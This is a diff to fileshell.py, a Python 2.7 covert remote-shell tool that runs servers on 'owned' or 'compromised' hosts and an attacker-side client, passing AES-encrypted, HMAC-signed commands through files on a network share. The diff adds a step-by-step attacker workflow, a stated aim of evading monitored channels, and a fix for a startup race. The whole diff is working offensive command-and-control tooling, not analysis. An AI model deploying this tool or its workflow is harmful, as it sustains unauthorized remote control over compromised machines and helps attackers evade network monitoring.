@@ -3,12 +3,27 @@
 '''
 fileshell.py -- a File-IO based remote shell, for use where there is no direct communication
 				channel between the attacker and the owned target, but they can communicate
-				by writing and reading files to/from a remote share/file server etc.
+				by writing and reading files to/from a remote share/file server etc, or where other forms 
+				of communication are monitored.
 
 				Tested to work on python 2.7.
 
 				Composed of a single client (runs on attacker machine) and one or more servers
-				(run on compromised machines).
+				(run on compromised machines). Currently you *must* start the server before running the client!
+				Sample workflow:
+
+				1. on host <owned1>, run 'python path\to\fileshell.py \\fileshare\myshare -s
+				2. on host <owned2>, run 'python path\to\fileshell.py \\fileshare\myshare -s
+				2. on your computer <h4x0r>, run 'python path\to\fileshell.py \\fileshare\myshare -c owned1
+
+				This will look like a usual shell from the client side, but behind the scenes it negotiates
+				symmetric encryption and signing keys via DH exchange, then for every command sent and every
+				output returned, it encrypts/decrypts via AES-CTR-128 and signs/verifies via HMAC-SHA256
+				with the derived keys. 
+				All communications, including the key exchange, are done over files	in the given root share
+				(the server will create a folder for its target the first time it runs).
+				The users (or computer accounts, if running as SYSTEM) running these scripts must have
+				read+write+modify access to the given share.
 
 				Features:
 				1. Client-server communication starts with a DH handshake for every new session, generating an encryption and a signing key.
@@ -17,11 +32,14 @@ fileshell.py -- a File-IO based remote shell, for use where there is no direct c
 				3. Client side features shell-like behaviour, with extra commands:
 					a. cc <hostname>: changes context (starts new session) to that of hostname.
 					b. exit: exits current session gracefully.
+
+				Dependencies:
+				1. PyCrypto for Python 2.7 (tested to work on PyCrypto v2.6)
 '''
 
 
 import os, sys, threading, socket, base64, hashlib, time
-import subprocess, logging, logging.handlers, binascii, hmac
+import subprocess, binascii, hmac
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 
@@ -140,9 +158,15 @@ class FileCommServer():
 			os.mkdir(self.comm_path)
 
 		try:
+			# Fix for the infinite loop occuring when client starts before server
+			self.in_fd = open(self.infile, 'rb')
+			first_data = self.in_fd.read()
+			self.in_fd.close()
+
 			self.in_fd = open(self.infile, 'wb+')
 			self.out_fd = open(self.outfile, 'wb+')
-		except ValueError:
+			_clear_and_write(first_data, self.in_fd)
+		except (ValueError, IOError):
 			raise
 
 
@@ -166,7 +190,7 @@ class FileCommServer():
 								self.write("[**] WARNING: Server received data with incorrect HMAC. Your connection might be tampered with!")
 								continue
 						except (AssertionError, TypeError):
-							self.write("[**] WARNING: Server received data with invalid HMAC. Your connection might be tampered with!")
+							self.write("[**] WARNING: Server received data with invalid HMAC or encoding. Your connection might be tampered with!")
 							continue
 
 						in_data = self.cipher.decrypt(in_data[:-32])
@@ -225,14 +249,14 @@ class FileCommServer():
 
 		if client_gxy != g_xy:
 			_clear_and_write("DH_FAIL_MISMATCHED_KEYS", self.out_fd)
-			raise Exception("Failure in DH key exchange - failed to verify identical public session keys.")
+			raise Exception("Failure in DH key exchange - failed to verify identical session keys.")
 
 		_clear_and_write("DHOK", self.out_fd)
 		key_parts = hashlib.sha256(hex(g_xy)).digest()
 		return key_parts[:16], key_parts[16:]
 
 	def self_destruct(self):
-		print("[*] in FileCommServer::self_destruct")
+		print("[*] in FileCommServer.self_destruct")
 		self.in_fd.close()
 		self.out_fd.close()
 
@@ -377,7 +401,7 @@ class FileCommClient():
 		return key_parts[:16], key_parts[16:]
 
 	def self_destruct(self):
-		print("[*] in FileCommClient::self_destruct")
+		print("[*] in FileCommClient.self_destruct")
 		self.in_fd.close()
 		self.out_fd.close()
 
